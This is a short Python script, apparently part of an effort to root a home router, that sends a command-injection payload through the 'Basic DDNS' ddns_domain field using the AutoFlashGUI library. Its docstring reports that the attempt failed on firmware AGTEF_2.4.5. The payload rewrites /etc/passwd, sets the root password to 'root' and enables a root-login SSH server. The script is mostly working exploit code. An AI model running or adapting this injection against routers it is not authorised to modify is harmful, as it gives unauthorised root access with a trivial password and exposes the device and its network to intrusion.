"""Attempt root via AutoFlashGUI's "Basic DDNS" command-injection variant
(ddns_domain field, /dyndns.lp -- a different endpoint from Advanced DDNS).

Result on AGTEF_2.4.5: same as the other two variants -- commands sent
without a transport error, SSH never came up. Three different injection
points all failing the same way is fairly strong evidence this class of
vulnerability was patched in this firmware version (vs. AGTEF_1.0.3, which
the original rooting notes for this device were written against).
"""
from afg_inject_common import afg, HOST, USERNAME, PASSWORD

CMD = (
    "sed -i 's#/root:.*$#/root:/bin/ash#' /etc/passwd;"
    "echo root:root | chpasswd;"
    "sed -i -e 's/#//' -e 's#askconsole:.*\\$#askconsole:/bin/ash#' /etc/inittab;"
    "uci -q delete dropbear.afg;"
    "uci add dropbear dropbear;"
    "uci rename dropbear.@dropbear[-1]=afg;"
    "uci set dropbear.afg.enable='1';"
    "uci set dropbear.afg.Interface='lan';"
    "uci set dropbear.afg.Port='22';"
    "uci set dropbear.afg.IdleTimeout='600';"
    "uci set dropbear.afg.PasswordAuth='on';"
    "uci set dropbear.afg.RootPasswordAuth='on';"
    "uci set dropbear.afg.RootLogin='1';"
    "uci commit dropbear;"
    "/etc/init.d/dropbear enable;"
    "/etc/init.d/dropbear restart"
)

result = afg.mainScript(
    host=HOST,
    username=USERNAME,
    password=PASSWORD,
    flashFirmware=False,
    upgradeFilename="",
    flashSleepDelay=120,
    activeMethod="BasicDDNS",
    activeCommand=CMD,
    splitCommand=True,
    ddnsService="dyndns.org",
    connectRetryDelay=5,
    interCommandDelay=5,
)
print("RESULT:", result)
